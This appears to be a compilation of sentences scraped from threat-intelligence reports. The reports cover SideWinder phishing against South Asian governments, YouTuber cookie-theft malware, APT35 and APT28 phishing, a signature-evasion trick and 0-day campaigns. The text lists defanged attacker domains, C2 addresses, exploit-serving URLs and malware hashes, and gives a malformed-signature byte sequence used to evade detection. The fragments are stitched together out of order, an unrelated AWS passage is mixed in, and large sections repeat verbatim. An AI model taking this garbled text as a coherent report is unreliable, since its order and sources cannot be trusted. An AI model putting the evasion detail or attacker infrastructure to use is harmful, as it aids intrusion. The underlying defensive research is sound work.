"As part of our efforts to combat serious threat actors, we use results of our research to improve the safety and security of our products."
We hope that improved understanding of the tactics and techniques will enhance threat hunting capability and lead to stronger user protections across the industry.
"Looking at the code of the page, we can see that only the WhatsApp download links are pointing to attacker controlled content for Android and iOS users."
The resulting application is signed with a certificate from a company named 3-1 Mobile SRL (Developer ID: 58UP7GFWAA).
The certificate satisfies all of the iOS code signing requirements on any iOS devices because the company was enrolled in the Apple Developer Enterprise Program.
The app is broken up into multiple parts.
It contains a generic privilege escalation exploit wrapper which is used by six different exploits.
"It also contains a minimalist agent capable of exfiltrating interesting files from the device, such as the Whatsapp database."
"In collaboration with TAG, Project Zero has published the technical analysis of CVE-2021-30983."
Installing the downloaded APK requires the victim to enable installation of applications from unknown sources.
"Although the applications were never available in Google Play, we have notified the Android users of infected devices and implemented changes in Google Play Protect to protect all users. Android Implant This analysis is based on fe95855691cada4493641bc4f01eb00c670c002166d6591fe38073dd0ea1d001 that was uploaded to VirusTotal on May 27."
"The Android app disguises itself as a legitimate Samsung application via its icon: When the user launches the application, a webview is opened that displays a legitimate website related to the icon."
The configuration is encoded with a 105-byte XOR key.
This trend should be concerning to all Internet users.
"While vulnerability research is an important contributor to online safety when that research is used to improve the security of products, vendors stockpiling zero-day vulnerabilities in secret poses a severe risk to the Internet especially if the vendor gets compromised."
"This has happened to multiple spyware vendors over the past ten years, raising the specter that their stockpiles can be released publicly without warning."
We look forward to continuing our work in this space and advancing the safety and security of our users around the world.
AWS has responded to this customer request by offering partner CloudFormation Resource Types directly from the AWS Management Console.
"CloudFormation now handles the details of automating that implementation, reducing the knowledge needed about the underlying mechanisms to automate that resource deployment."
"Tags Cloud | Malware | Cyber Crime | Exploits & Vulnerabilities | Phishing | Deep Web | Cyber Threats | APT & Targeted Attacks | Compliance & Risks | Articles, News, Reports | Security Strategies"
"While tracking the activities of the SideWinder group, which has become infamous for targeting the South Asia region and its surrounding countries, we identified a server used to deliver a malicious LNK file and host multiple credential phishing pages."
We learned that these pages were copied from their victims’ webmail login pages and subsequently modified for phishing.
We believe further activities are propagated via spear-phishing attacks.
"After the gathered credentials are sent, some of the phishing pages will redirect victims to different documents or news pages."
"Furthermore, it seems that these lures are distributed via phishing links."
We also found multiple Android APK files on their phishing server.
"One of the normal applications, called “OpinionPoll,” is a survey app for gathering opinions regarding the Nepal-India political map dispute, which seems to be another political lure similar to the one they used in the spear-phishing portion."
SideWinder has been very active in 2020.
Analysis of the malicious document
The use of malicious documents is one of SideWinder’s most common infection vectors.
An example of a downloaded ZIP file containing an LNK file that is used to download a malicious HTA file
"All of these cases end up with either the downloading or dropping of files and then the execution of JavaScript code, which is a dropper used to install the main backdoor + stealer."
The downloaded RTF files exploit the CVE-2017-11882 vulnerability
"It drops a file named 1.a (a JavaScript code), which drops the backdoor + stealer into a folder in ProgramData and directly executes it or creates a scheduled task to execute the dropped files at a later time."
Figure 2.
A scheduled task with a command to execute the dropped backdoor + stealer
"The content of the newly created folder contains a few files, including Rekeywiz (EFS REKEY wizard, FA86B5BC5343CA92C235304B8DCBCF4188C6BE7D4621C625564BEBD5326ED850), which is a legitimate Windows application."
Figure 3.
This fake DLL library decrypts the main backdoor + stealer from the .tmp file in the same directory.
Figure 5. Algorithm for decrypting both main backdoor + stealer and configuration
The decrypted payload is the main backdoor .NET executable binary.
Figure 6.
"In Resources, the Default resource contains the encrypted configuration."
"After decryption (using the same principle as with the main backdoor + stealer), the configuration reveals which file formats the attackers are targeting."
Figure 7.
The decrypted configuration The main functions of the backdoor + stealer are: 1) Downloading the .NET executable and running it 2) Collecting system information and uploading it to the command-and-control (C&C) server 3) Uploading selected files to the C&C server
The spear-phishing attack
We found several interesting dynamic DNS domains resolving to a server that was used to deliver SideWinder’s malicious documents.
"For example, “mail-nepalgovnp[.]duckdns[.]org” was created to pretend to be the original Nepal government’s domain “mail[.]nepal[.]gov[.]np”."
"Digging deeper, we found that it hosted several phishing pages."
These pages were copied from the webmail servers of various targets and then modified for spear-phishing attacks designed to steal login credentials.
"Although it’s not clear to us how these phishing pages are delivered to the victims, finding the original webmail servers that they copied to make these phishing pages allows us to identify who they were targeting."
"Analysis of the phishing pages revealed that most of them would redirect to the original webmail servers, which they copied after the victims sent out their login credentials."
These documents and news are probably interesting in some way to their targets and are used to make them click and log in to the phishing pages.
“India reaction after new pak map.pdf” – a document talking about India’s response to the new political map revealed by Pakistan in August.
"The following table shows their targets, related phishing domains, and lure documents used in each of the phishing attacks. Date Phishing Domain Targeted Organization Targeted Mail server Redirection after login 2019 Nov Government of Nepal mail.nepal.gov.np Redirect to file “IMG_0002.pdf” 2019 Nov Ministry of Defence, Nepal mail.mod.gov.np Redirect to original mail server 2019 Dec mail-"
mofagovnp.zapto[.]org
mail.mofa.gov.np
af[.]org
"Administrative Office of the President, Afghanistan imail.aop.gov.af Redirect to web page “﻿Observation Of Technology Use in Afghanistan Government Sector” 2020 Jan mail-nscaf.myftp[.]org Afghanistan National Security Council mail.nsc.gov.af Redirect to https://wikipedia.org/USB_Killer 2020 Jan mail-nepalarmymilnp.duckdns[.]org Nepali Army mail.nepalarmy.mil.np Redirect to PDF “﻿EN Digital Nepal Framework V8.4 15 July 2019.pdf” 2020 Jan mail-mofagovnp.hopto[.]org Ministry of Foreign Affairs, Nepal mail.mofa.gov.np Redirect to PDF “﻿national-security-vol-3-issue-1-essay-SSimkhada.pdf” 2020 Jan webmail.mohe.gov-af[.]org Ministry of Higher Education, Afghanistan webmail.mohe.gov.af Redirect to original mail server 2020 Feb Ministry of Defense, Sri Lanka mail.defence.lk Login Error 2020 Feb mail.moha.gov-np[.]org Ministry of Home Affairs, Nepal mail.moha.gov.np Redirect to original mail server 2020 Feb mail.nsc.gov-af[.]org Afghanistan National Security Council mail.nsc.gov.af Redirect to original mail server 2020 Feb mail.arg.gov-af[.]org Presidential Palace, Afghanistan mail.arg.gov.af Redirect to original mail server 2020 Feb mail.arg.gov-af[.]org Presidential Palace, Afghanistan mail.arg.gov.af Redirect to original mail server 2020 Feb Center for Education and Human Resource Development, Nepal mail.doe.gov.np Redirect to file “Para Basic Course Joining Instruction.docx” 2020 Mar mail-nepalgovnp.duckdns[.]org Government of Nepal mail.nepal.gov.np Redirect to original mail server 2020 Mar Nepal Electricity Authority mail.nea.org.np Redirect to original mail server 2020 Mar mail-nepalgovnp.duckdns[.]org Government of Nepal mail.nepal.gov.np Redirect to file “central data form.pdf” 2020 Mar mail-nepalarmymilnp.duckdns[.]org Nepali Army mail.nepalarmy.mil.np Redirect to file “Corona Virus Preparedness and Response.pdf” 2020 Mar mail-nepalpolicegov.hopto[.]org Nepal Police mail.nepalpolice.gov.np Redirect to file “1987 Conducting training on COVID-19 and keeping it in readiness.pdf” 2020 Apr mail-nrborg.hopto[.]org Nepal Rastra Bank mail.nrb.gov.np Redirect to file ”fiu.pdf” 2020 May mail-nepalarmymilnp.duckdns[.]org Nepali Army mail.nepalarmy.mil.np Redirect to web news “India Should Realise China Has Nothing to Do With Nepal’s Stand on Lipulekh” 2020 Jun mail-nepalarmymilnp.duckdns[.]org Nepali Army mail.nepalarmy.mil.np Showing login failed message 2020 Jul Qatar Charity mail.qcharity.org Redirect to original mail server 2020 Jul Myanma Posts and Telecommunications webmail.mpt.net.mm Redirect to original mail server 2020 Aug mail-ncporgnp.hopto[.]org Nepal Communist Party mail.ncp.org.np Redirect to file “India reaction after new pak map.pdf” 2020 Aug mail-nscaf.myftp[.]org Afghanistan National Security Council mail.nsc.gov.af Redirect to 10[.]77[.]17[.]10/Software/03-Applications 2020 Sep mail-mofgovnp.hopto[.]org Ministry of Finance, Nepal mail.mof.gov.np Redirect to file “1987 Covid.pdf” 2020 Sep mail-ncporgnp.hopto[.]org Nepal Communist Party mail.ncp.org.np Redirect to document “﻿The spectre of a new Maoist conflict in Nepal” 2020 Sep imail.aop.gov-af[.]org Administrative Office of the President, Afghanistan imail.aop.gov.af Redirect to file “SOP of Military Uniform .pdf” 2020 Oct mail-nepalpolicegovnp.duckdns[.]org Nepal Police mail.nepalpolice.gov.np Redirect to file “2077-07-03 1239 Regarding investigation and action.pdf” 2020 Oct Civil Aviation Authority of Nepal mail.caanepal.gov.np Redirect to original mail server 2020 Oct mail-apfgovnp.ddns[.]net mail-apfgavnp.hopto[.]org Armed Police Force, Nepal mail.apf.gov.np Redirect to original mail server 2020 Oct mail-nscaf.myftp[.]org Afghanistan National Security Council mail.nsc.gov.af Redirect to file “IT Services Request Form.pdf” 2020 Nov mail-ntcnetnp.serveftp[.]com Nepal Telecom webmail.ntc.net.np Redirect to original mail server 2020 Nov mail-kmgcom.ddns[.]net Kantipur Media Group mail.kmg.com.np Redirect to original mail server 2020 Nov Federal Parliament of Nepal mail.parliament.gov.np Redirect to original mail server 2020 Nov Public Procurement Monitoring Office, Nepal mail.ppmo.gov.np Redirect to original mail server 2020 Nov mail-mfagovcn.hopto[.]org Ministry of Foreign Affairs, China mail.mfa.gov.cn Redirect to file “﻿Ambassador Yanchi Conversation with Nepali_Media.pdf” Figure 8."
SideWinder’s phishing page disguised as a Nepalese Army OWA (Outlook Web Access) Page Figure 9.
The lure document redirected from the phishing page that discusses Indian and Pakistani political map issues Figure 10
We also identified multiple Android APK files on their server.
Figure 11.
Non-malicious applications “My First APP” and “Opinion Poll” Another two applications were built from JavaPayload for Metasploit that will load extra code from the remote server configured in the sample.
These two samples appear to be debug versions as they have no activities or any other component except Metasploit.
Figure 13. Build from Metasploit and Request Permissions We also identified a malicious version of the My First APP application that added Metasploit whose class names have been obfuscated.
Figure 14.
"Malicious version of My First APP, which adds Metasploit SideWinder has used malicious apps as part of its operation before."
Conclusion
"As seen with their phishing attacks and their mobile device tools’ continuous development, SideWinder is very proactive in using trending topics like Covid-19 or various political issues as a social engineering technique to compromise their targets."
Indicator of Compromise Android Part IoCs Indicator Package name Label C2 server Detection 0c182b51ff1dffaa384651e478155632c6e65820322774e416be20e6d49bb8f9 com.example.firstandoidapp
My First App - 061b0379a12b88488db8540226e400e3f65fef9a4c1aa7744da9f17e1d93d78d com.example.opinionpoll OpinionPoll - fb6ac9d93fd47db3d32f6da6320344a125e96754a94babb9d9d12b6604a42536 com.metasploit.stage MainActivity https://185.225.19[.]46:4589 AndroidOS_Metasploit.HRX 468b74883536938ef3962655dfcc3ca4097ca9b5b687dfc1fef58d50e96dc248 com.metasploit.stage MainActivity tcp://185.225.19.46[:]4875 AndroidOS_Metasploit.HRX a377e5f4bf461b86f938959256b7ab8b1b40bb9fd3cd45951c736a22366a8dd1 com.example.firstandoidapp My First App tcp://185.225.19.46[:]4875 AndroidOS_Metasploit.
HRX
Malicious documents and related payloads IoCs Indicator Description Detection TrendX 1CBEC920AFE2F978B8F84E0A4E6B757D400AEB96E8C0A221130060B196ECE010 docx Trojan.W97M.CVE20170199.FAIL 7238F4E5EDBE0E5A2242D8780FB58C47E7D32BF2C4F860C88C511C30675D0857 RTF file Trojan.W97M.SIDEWINDER.A 75C158CEA14E338C8D9D32ED988C7032DA9AE6D54F5B1126ED6A83F71B9E03BF 1.a JS file Trojan.JS.SIDEWINDER.A Downloader.JS.TRX.XXJSE9EFF018 AB6E8563214EEB747ABF77F9CC50796CC6A0C0562C6BEC720D7F2C978D34C412
Fake DUser.dll Trojan.MSIL.SIDEWINDER.A CBD5C68F5C4345B68F018D9E5810574E8036A2BC4D826BE5C8779E8019449957 Final payload Trojan.Win32.SIDEWINDER.B 34446F7F60F730FCCA145155D10D1AFF0A1153B085836DF38313772CD03C8D70 RTF file Trojan.W97M.CVE201711882.YQUOOWV 7238F4E5EDBE0E5A2242D8780FB58C47E7D32BF2C4F860C88C511C30675D0857 RTF file
Trojan.W97M.SIDEWINDER.A AB7C1967BF1FEFDFFDE93626B78EB30994655AB02F59E0ADB0935E3E599A953F RTF file Trojan.W97M.SIDEWINDER.A 2548A819E4C597BA5958D2D18BAA544452948E5B00271570192CCD79ABE88E8D 1.a JS file Trojan.JS.SIDEWINDER.A Downloader.
JS.TRX.XXJSE9EFF018
ED5E1D6E914DE64A203F2F32AB95176FC7EFFF3A520915971D5FE748E79D611C
1.a JS file Trojan.JS.SIDEWINDER.A Downloader.
JS.TRX.XXJSE9EFF018
96BF8F579ACB8D9D0FF116D05FDADEF85953F11E5B2E703041FDAE0ABF5B75DC
1.a JS file Trojan
.JS.SIDEWINDER.A
Downloader.JS.TRX.XXJSE9EFF018 940265867D5668956D64ADF9FC4B9C6CF9E7FCFCF5C21BA7BF0BEA77B5EDD047 Fake DUser.dll Trojan.MSIL.SIDEWINDER.A B22946CFEFE8646CB034F358C68CAAE5F30C1CF316CFFEAF77021C099E362C64 Fake DUser.dll Trojan.MSIL.SIDEWINDER.A 89E392FA49C6A6AEB9056E3D2F38B07D0DD7AF230CD22E3B01C71F05A3AECA0B Fake DUser.dll Trojan.MSIL.SIDEWINDER.A EB2D82DD0799196FCF631E15305676D737DC6E40FF588DCF123EDACD023F1C46 Final payload Trojan.Win32.SIDEWINDER.B 7ECAEFCB46CDDEF1AE201B1042A62DD093594C179A6913A2DE47AB98148545DD Final payload Trojan.Win32.SIDEWINDER.B 799260B992C77E2E14F2D586665C570142D8425864455CAB5F2575015CD0B87A Final payload Trojan.Win32.SIDEWINDER.B brep.cdn-edu[.]net RTF delivery server www.mfa.filesrvr[.]net RTF delivery server www.google.gov-pok[.]net RTF delivery server ap
-ms[.]net C&C cdn-sop[.]net C&C fqn-cloud[.]net C&C ms-trace[.]net C&C imail.aop.gov-af[.]org Phishing Domain mail-apfgavnp.hopto[.]org Phishing Domain mail-apfgovnp.ddns[.]net Phishing Domain mail-kmgcom.ddns[.]net Phishing Domain mail-mfagovcn.hopto[.]org Phishing Domain mail
-mofagovnp.hopto[.]org Phishing Domain mail-ncporgnp.hopto[.]org Phishing Domain mail-nepalarmymilnp.duckdns[.]org Phishing Domain mail-nepalgovnp.duckdns[.]org Phishing Domain mail-nepalpolicegov.hopto[.]org Phishing Domain mail-nepalpolicegovnp.duckdns[.]org Phishing Domain mail-nrborg.hopto[.]org Phishing Domain mail-nscaf.myftp[.]org Phishing Domain mail-ntcnetnp.serveftp[.]com Phishing Domain mail.arg.gov-af[.]org Phishing Domain mail.moha.gov-np[.]org Phishing Domain mail.nsc.gov-af[.]org Phishing Domain webmail.mohe.gov-af[.]org Phishing Domain Tags
"Since late 2019, our team has disrupted financially motivated phishing campaigns targeting YouTubers with Cookie Theft malware."
"The actors behind this campaign, which we attribute to a group of hackers recruited in a Russian-speaking forum, lure their target with fake collaboration opportunities (typically a demo for anti-virus software, VPN, music players, photo editing or online games), hijack their channel, then either sell it to the highest bidder or use it to broadcast cryptocurrency scams."
"In collaboration with YouTube, Gmail, Trust & Safety, CyberCrime Investigation Group and Safe Browsing teams, our protections have decreased the volume of related phishing emails on Gmail by 99.6% since May 2021."
"We blocked 1.6M messages to targets, displayed ~62K Safe Browsing phishing page warnings, blocked 2.4K files, and successfully restored ~4K accounts."
"Moreover, to protect our users, we have referred the below activity to the FBI for further investigation."
"Cookie Theft, also known as “pass-the-cookie attack,” is a session hijacking technique that enables access to user accounts with session cookies stored in the browser."
The phishing typically started with a customized email introducing the company and its products.
"Once the target agreed to the deal, a malware landing page disguised as a software download URL was sent via email or a PDF on Google Drive, and in a few cases, Google documents containing the phishing links."
"During the pandemic, we also uncovered attackers posing as news providers with a “Covid19 news software.”"
"Because Google actively detects and disrupts phishing links sent via Gmail, the actors were observed driving targets to messaging apps like WhatsApp, Telegram or Discord."
"Some commodity malware used included RedLine, Vidar, Predator The Thief, Nexus stealer, Azorult, Raccoon, Grand Stealer, Vikro Stealer, Masad (Google’s naming), and Kantal (Google’s naming) which shares code similarity with Vidar."
Open source malware like Sorano and AdamantiumThief were also observed.
A few were observed displaying a fake error message requiring user click-through to continue execution.
"On account-trading markets, hijacked channels ranged from $3 USD to $4,000 USD depending on the number of subscribers."
Our recommendations: Additional resources: Avoid & Report Phishing Emails.
Related Malware hashes: Top Phishing Domains:
We have a long-standing policy to send you a warning if we detect that your account is a target of government-backed phishing or malware attempts.
"On any given day, TAG is tracking more than 270 targeted or government-backed attacker groups from more than 50 countries."
"In this blog, we explore some of the most notable campaigns we’ve disrupted this year from a different government-backed attacker: APT35, an Iranian group, which regularly conducts phishing campaigns targeting high risk users."
"In early 2021, APT35 compromised a website affiliated with a UK university to host a phishing kit."
Users were instructed to activate an invitation to a (fake) webinar by logging in.
The phishing kit will also ask for second-factor authentication codes sent to devices.
"APT35 has relied on this technique since 2017 — targeting high-value accounts in government, academia, journalism, NGOs, foreign policy, and national security."
Credential phishing through a compromised website demonstrates these attackers will go to great lengths to appear legitimate – as they know it's difficult for users to detect this kind of attack.
"In May 2020, we discovered that APT35 attempted to upload spyware to the Google Play Store."
"Although Play Store users were protected, we are highlighting the app here as TAG has seen APT35 attempt to distribute this spyware on other platforms as recently as July 2021."
One of the most notable characteristics of APT35 is their impersonation of conference officials to conduct phishing attacks.
"When they did, attackers sent them phishing links in follow-on correspondence."
Targets typically had to navigate through at least one redirect before landing on a phishing domain.
One of APT35’s novel techniques involves using Telegram for operator notifications.
The attackers embed javascript into phishing pages that notify them when the page has been loaded.
"The attackers use this function to relay device-based data to the channel, so they can see details such as the IP, useragent, and locales of visitors to their phishing sites in real-time."
We warn users when we suspect a government-backed threat like APT35 is targeting them.
"When a site identified by Safe Browsing as harmful appears in Google Search results, we show a warning next to it in the results."
Indicators from APT28 phishing campaign: service-reset-password-moderate-digital.rf[.]gd reset-service-identity-mail.42web[.]io digital-email-software.great-site[.]net Indicators from APT35 campaigns: Abused Google Properties: https://sites.google[.]com/view/ty85yt8tg8-download-rtih4ithr/ https://sites.google[.]com/view/user-id-568245/ https://sites.google[.]com/view/hhbejfdwdhwuhscbsb-xscvhdvbc/ Abused Dropbox Properties: https://www.dropbox[.]com/s/68y4vpfu8pc3imf/Iraq&Jewish.pdf
Phishing Domains: nco2[.]live summit-files[.]com filetransfer[.]club continuetogo[.]me accessverification[.]online customers-verification-identifier[.]site service-activity-session[.]online identifier-service-review[.]site recovery-activity-identification[.]site review-session-confirmation[.]site recovery-service-activity[.]site verify-service-activity[.]site service-manager-notifications[.]info
Android App: https://www.virustotal.com/gui/file/5d3ff202f20af915863eee45916412a271bae1ea3a0e20988309c16723ce4da5/detection Android App C2: communication-shield[.]site cdsa[.]xyz
Understanding the techniques used by attackers helps us counter these threats effectively.
We believe this is a technique the attacker is using to evade detection rules.
"Code signatures on Windows executables provide guarantees about the integrity of a signed executable, as well as information about the identity of the signer."
"Since mid-August, OpenSUpdater samples have carried an invalid signature, and further investigation showed this was a deliberate attempt to evade detection."
Bytes: 30 0D 06 09 2A 86 48 86 F7 0D 01 01 0B 00 00
"As shown in the following screenshot, the signature is considered to be valid by the Windows operating system."
"Since first discovering this activity, OpenSUpdater's authors have tried other variations on invalid encodings to further evade detection."
The following are samples using this evasion: https://www.virustotal.com/gui/file/5094028a0afb4d4a3d8fa82b613c0e59d31450d6c75ed96ded02be1e9db8104f/detection
New variant: https://www.virustotal.com/gui/file/5c0ff7b23457078c9d0cbe186f1d05bfd573eb555baa1bf4a45e1b79c8c575db/detection
The four exploits were used as a part of three different campaigns.
The links led to attacker-controlled domains that mimicked legitimate websites related to the targeted users.
"The information collected from the fingerprinting phase included screen resolution, timezone, languages, browser plugins, and available MIME types."
"In our environment, we did not receive any payloads past this stage."
Related IOCs lragir[.]org armradio[.]org asbares[.]com armtimes[.]net armlur[.]org armenpress[.]org hraparak[.]org armtimes[.]org hetq[.]org
"After a fingerprinting phase, similar to the one used with the Chrome exploit above, users were served an Internet Explorer 0-day."
We did not recover additional payloads in our environment.
During our investigation we discovered several documents uploaded to VirusTotal.
Related IOCs
Examples of related Office documents uploaded to VirusTotal: https://www.virustotal.com/gui/file/656d19186795280a068fcb97e7ef821b55ad3d620771d42ed98d22ee3c635e67/detection https://www.virustotal.com/gui/file/851bf4ab807fc9b29c9f6468c8c89a82b8f94e40474c6669f105bce91f278fdb/detection
Unique URLs serving ​​CVE-2021-33742 Internet Explorer exploit: http://lioiamcount[.]com/IsnoMLgankYg6/EjlYIy7cdFZFeyFqE4IURS1 http://db-control-uplink[.]com/eFe1J00hISDe9Zw/gzHvIOlHpIXB http://kidone[.]xyz/VvE0yYArmvhyTl/GzV
Word documents with the following classid: {EAB22AC3-30C1-11CF-A7EB-0000C05BAE0B} Related infrastructure: workaj[.]com wordzmncount[.]com Not all attacks require chaining multiple 0-day exploits to be successful.
(NOTE: This exploit is not connected to the other three we’ve discussed above.)
The victim would need to have a session open on these websites from Safari for cookies to be successfully exfiltrated.
There was no sandbox escape or implant delivered via this exploit.
The exploit targeted iOS versions 12.4 through 13.7.
Related IOCs supportcdn.web[.]app vegmobile[.]com 111.90.146[.]198
Increased Utilization
"In the mid-to-late 2010s, more private companies have joined the marketplace selling these 0-day capabilities."
"No longer do groups need to have the technical expertise, now they just need resources."
This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q2 2021.
"It was last updated on July 29, 2021."
JuneWe terminated 33 YouTube channels as part of our investigation into coordinated influence operations linked to Azerbaijan.
We terminated 15 YouTube channels as part of our investigation into coordinated influence operations linked to Ethiopia.
We received leads from Graphika that supported us in this investigation.
We terminated 123 YouTube channels as part of our investigation into coordinated influence operations linked to Russia.
We terminated 9 YouTube channels as part of our investigation into coordinated influence operations linked to China.
We received leads from Graphika that supported us in this investigation.
We terminated 2 YouTube channels as part of our investigation into coordinated influence operations linked to Moldova.
We terminated 33 YouTube channels as part of our investigation into coordinated influence operations linked to Azerbaijan.
We terminated 15 YouTube channels as part of our investigation into coordinated influence operations linked to Ethiopia.
We received leads from Graphika that supported us in this investigation.
We terminated 123 YouTube channels as part of our investigation into coordinated influence operations linked to Russia.
We terminated 9 YouTube channels as part of our investigation into coordinated influence operations linked to China.
We received leads from Graphika that supported us in this investigation.
We terminated 2 YouTube channels as part of our investigation into coordinated influence operations linked to Moldova.
This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q1 2021.
"It was last updated on April 20, 2021."
We terminated 5 blogs as part of our investigation into coordinated influence operations linked to Morocco.
We terminated 5 YouTube channels as part of our investigation into coordinated influence operations linked to Brazil.
We terminated 6 YouTube channels as part of our investigation into coordinated influence operations linked to Kyrgyzstan.
We terminated 3 advertising accounts as part of our investigation into coordinated influence operations linked to Egypt.
We terminated 1 YouTube channel as part of our ongoing investigation into coordinated influence operations linked to Russia.
We terminated 5 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Russia.
We terminated 2 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Russia.
We terminated 3 YouTube channels as part of our ongoing investigation into coordinated influence operations linked to Iran.
We received leads from FireEye that supported us in this investigation.
"Since late 2019, our team has disrupted financially motivated phishing campaigns targeting YouTubers with Cookie Theft malware."
"The actors behind this campaign, which we attribute to a group of hackers recruited in a Russian-speaking forum, lure their target with fake collaboration opportunities (typically a demo for anti-virus software, VPN, music players, photo editing or online games), hijack their channel, then either sell it to the highest bidder or use it to broadcast cryptocurrency scams."
"In collaboration with YouTube, Gmail, Trust & Safety, CyberCrime Investigation Group and Safe Browsing teams, our protections have decreased the volume of related phishing emails on Gmail by 99.6% since May 2021."
"We blocked 1.6M messages to targets, displayed ~62K Safe Browsing phishing page warnings, blocked 2.4K files, and successfully restored ~4K accounts."
"Moreover, to protect our users, we have referred the below activity to the FBI for further investigation."
"Cookie Theft, also known as “pass-the-cookie attack,” is a session hijacking technique that enables access to user accounts with session cookies stored in the browser."
The phishing typically started with a customized email introducing the company and its products.
"Once the target agreed to the deal, a malware landing page disguised as a software download URL was sent via email or a PDF on Google Drive, and in a few cases, Google documents containing the phishing links."
"During the pandemic, we also uncovered attackers posing as news providers with a “Covid19 news software.”"
"Because Google actively detects and disrupts phishing links sent via Gmail, the actors were observed driving targets to messaging apps like WhatsApp, Telegram or Discord."
"Some commodity malware used included RedLine, Vidar, Predator The Thief, Nexus stealer, Azorult, Raccoon, Grand Stealer, Vikro Stealer, Masad (Google’s naming), and Kantal (Google’s naming) which shares code similarity with Vidar."
Open source malware like Sorano and AdamantiumThief were also observed.
A few were observed displaying a fake error message requiring user click-through to continue execution.
"On account-trading markets, hijacked channels ranged from $3 USD to $4,000 USD depending on the number of subscribers."
Our recommendations: Additional resources: Avoid & Report Phishing Emails.
Related Malware hashes: Top Phishing Domains:
We have a long-standing policy to send you a warning if we detect that your account is a target of government-backed phishing or malware attempts.
"On any given day, TAG is tracking more than 270 targeted or government-backed attacker groups from more than 50 countries."
"In this blog, we explore some of the most notable campaigns we’ve disrupted this year from a different government-backed attacker: APT35, an Iranian group, which regularly conducts phishing campaigns targeting high risk users."
"In early 2021, APT35 compromised a website affiliated with a UK university to host a phishing kit."
Users were instructed to activate an invitation to a (fake) webinar by logging in.
The phishing kit will also ask for second-factor authentication codes sent to devices.
"APT35 has relied on this technique since 2017 — targeting high-value accounts in government, academia, journalism, NGOs, foreign policy, and national security."
Credential phishing through a compromised website demonstrates these attackers will go to great lengths to appear legitimate – as they know it's difficult for users to detect this kind of attack.
"In May 2020, we discovered that APT35 attempted to upload spyware to the Google Play Store."
"Although Play Store users were protected, we are highlighting the app here as TAG has seen APT35 attempt to distribute this spyware on other platforms as recently as July 2021."
One of the most notable characteristics of APT35 is their impersonation of conference officials to conduct phishing attacks.
"When they did, attackers sent them phishing links in follow-on correspondence."
Targets typically had to navigate through at least one redirect before landing on a phishing domain.
One of APT35’s novel techniques involves using Telegram for operator notifications.
The attackers embed javascript into phishing pages that notify them when the page has been loaded.
"The attackers use this function to relay device-based data to the channel, so they can see details such as the IP, useragent, and locales of visitors to their phishing sites in real-time."
We warn users when we suspect a government-backed threat like APT35 is targeting them.
"When a site identified by Safe Browsing as harmful appears in Google Search results, we show a warning next to it in the results."
Indicators from APT28 phishing campaign: service-reset-password-moderate-digital.rf[.]gd reset-service-identity-mail.42web[.]io digital-email-software.great-site[.]net Indicators from APT35 campaigns: Abused Google Properties: https://sites.google[.]com/view/ty85yt8tg8-download-rtih4ithr/ https://sites.google[.]com/view/user-id-568245/ https://sites.google[.]com/view/hhbejfdwdhwuhscbsb-xscvhdvbc/ Abused Dropbox Properties: https://www.dropbox[.]com/s/68y4vpfu8pc3imf/Iraq&Jewish.pdf
Phishing Domains: nco2[.]live summit-files[.]com filetransfer[.]club continuetogo[.]me accessverification[.]online customers-verification-identifier[.]site service-activity-session[.]online identifier-service-review[.]site recovery-activity-identification[.]site review-session-confirmation[.]site recovery-service-activity[.]site verify-service-activity[.]site service-manager-notifications[.]info
Android App: https://www.virustotal.com/gui/file/5d3ff202f20af915863eee45916412a271bae1ea3a0e20988309c16723ce4da5/detection Android App C2: communication-shield[.]site cdsa[.]xyz
Understanding the techniques used by attackers helps us counter these threats effectively.
We believe this is a technique the attacker is using to evade detection rules.
"Code signatures on Windows executables provide guarantees about the integrity of a signed executable, as well as information about the identity of the signer."
"Since mid-August, OpenSUpdater samples have carried an invalid signature, and further investigation showed this was a deliberate attempt to evade detection."
Bytes: 30 0D 06 09 2A 86 48 86 F7 0D 01 01 0B 00 00
"As shown in the following screenshot, the signature is considered to be valid by the Windows operating system."
"Since first discovering this activity, OpenSUpdater's authors have tried other variations on invalid encodings to further evade detection."
The following are samples using this evasion: https://www.virustotal.com/gui/file/5094028a0afb4d4a3d8fa82b613c0e59d31450d6c75ed96ded02be1e9db8104f/detection
New variant: https://www.virustotal.com/gui/file/5c0ff7b23457078c9d0cbe186f1d05bfd573eb555baa1bf4a45e1b79c8c575db/detection
The four exploits were used as a part of three different campaigns.
The links led to attacker-controlled domains that mimicked legitimate websites related to the targeted users.
"The information collected from the fingerprinting phase included screen resolution, timezone, languages, browser plugins, and available MIME types."
"In our environment, we did not receive any payloads past this stage."
Related IOCs lragir[.]org armradio[.]org asbares[.]com armtimes[.]net armlur[.]org armenpress[.]org hraparak[.]org armtimes[.]org hetq[.]org
"After a fingerprinting phase, similar to the one used with the Chrome exploit above, users were served an Internet Explorer 0-day."
We did not recover additional payloads in our environment.
During our investigation we discovered several documents uploaded to VirusTotal.
Related IOCs
Examples of related Office documents uploaded to VirusTotal: https://www.virustotal.com/gui/file/656d19186795280a068fcb97e7ef821b55ad3d620771d42ed98d22ee3c635e67/detection https://www.virustotal.com/gui/file/851bf4ab807fc9b29c9f6468c8c89a82b8f94e40474c6669f105bce91f278fdb/detection
Unique URLs serving ​​CVE-2021-33742 Internet Explorer exploit: http://lioiamcount[.]com/IsnoMLgankYg6/EjlYIy7cdFZFeyFqE4IURS1 http://db-control-uplink[.]com/eFe1J00hISDe9Zw/gzHvIOlHpIXB http://kidone[.]xyz/VvE0yYArmvhyTl/GzV
Word documents with the following classid: {EAB22AC3-30C1-11CF-A7EB-0000C05BAE0B} Related infrastructure: workaj[.]com wordzmncount[.]com Not all attacks require chaining multiple 0-day exploits to be successful.
(NOTE: This exploit is not connected to the other three we’ve discussed above.)
The victim would need to have a session open on these websites from Safari for cookies to be successfully exfiltrated.
There was no sandbox escape or implant delivered via this exploit.
The exploit targeted iOS versions 12.4 through 13.7.
Related IOCs supportcdn.web[.]app vegmobile[.]com 111.90.146[.]198
Increased Utilization
"In the mid-to-late 2010s, more private companies have joined the marketplace selling these 0-day capabilities."
"No longer do groups need to have the technical expertise, now they just need resources."
This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q2 2021.
"It was last updated on July 29, 2021."
JuneWe terminated 33 YouTube channels as part of our investigation into coordinated influence operations linked to Azerbaijan.
We terminated 15 YouTube channels as part of our investigation into coordinated influence operations linked to Ethiopia.
We received leads from Graphika that supported us in this investigation.
We terminated 123 YouTube channels as part of our investigation into coordinated influence operations linked to Russia.
